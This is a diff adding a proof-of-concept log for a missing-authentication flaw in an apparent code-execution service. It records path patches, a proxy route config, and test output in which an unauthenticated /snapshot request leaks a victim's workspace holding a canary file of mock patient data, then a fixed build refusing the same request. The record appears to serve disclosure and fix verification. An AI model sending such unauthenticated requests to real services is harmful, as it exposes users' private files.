@@ -1,0 +1,47 @@
+=== path-constant patch (the only change to the shipped code):
+-	workspace  = "/workspace"
+-	socketPath = "/run/execsock/exec.sock"
++	workspace  = "/tmp/cee-poc.qiF2Eg/workspace"
++	socketPath = "/tmp/cee-poc.qiF2Eg/run/execsock/exec.sock"
+-const uploadsDir = "/user-uploads"
++const uploadsDir = "/tmp/cee-poc.qiF2Eg/user-uploads"
+-	executorSocket = "/run/execsock/exec.sock"
++	executorSocket = "/tmp/cee-poc.qiF2Eg/run/execsock/exec.sock"
+
+=== shim config:
+# local-only knobs (not in tinfoil-config.yml)
+listen-port: 18443
+tls-mode: self-signed
+hpke-key-file: /tmp/cee-poc.qiF2Eg/shim/hpke_key.json
+cache-dir: /tmp/cee-poc.qiF2Eg/shim/cache
+# verbatim shim: block of tinfoil-config.yml @ 8676c64
+upstream-port: 8000
+paths:
+  - /exec
+  - /read
+  - /write
+  - /snapshot
+  - /restore
+  - /sync-uploads/manifest
+  - /sync-uploads/blobs
+  - /health
+
+################ vulnerable build (api-server, shipped executor, tfshim v0.3.18)
+processes: nobody executor;nobody api-server;nobody tfshim;
+[victim]   /write notes/secret.txt (token)   HTTP 200  {"path":"notes/secret.txt","size":53}
+[attacker] /read  (no token)                 HTTP 401  {"error":"missing container auth token"}
+[attacker] /read  (wrong token)              HTTP 403  {"error":"container auth token mismatch"}
+[attacker] /snapshot (no token, no body)     HTTP 200  {"tar":"bm90ZXMvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    tar entry: notes/ (0 bytes)
+    tar entry: notes/secret.txt (53 bytes)
+    contents of notes/secret.txt: CANARY-2c7d46c979ec patient=Jane Doe dx=confidential
+RESULT vulnerable: attacker without token obtained the victim's workspace (canary matched)
+
+################ fixed build (api-server-fixed, shipped executor, tfshim v0.3.18)
+processes: nobody executor;nobody api-server-fixe;nobody tfshim;
+[victim]   /write notes/secret.txt (token)   HTTP 200  {"path":"notes/secret.txt","size":53}
+[attacker] /read  (no token)                 HTTP 401  {"error":"missing container auth token"}
+[attacker] /read  (wrong token)              HTTP 403  {"error":"container auth token mismatch"}
+[attacker] /snapshot (no token, no body)     HTTP 401  {"error":"missing container auth token"}
+[orchestrator] /snapshot (victim token)      HTTP 200  {"tar":"bm90ZXMvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+RESULT fixed: /snapshot without token refused; token holder still snapshots
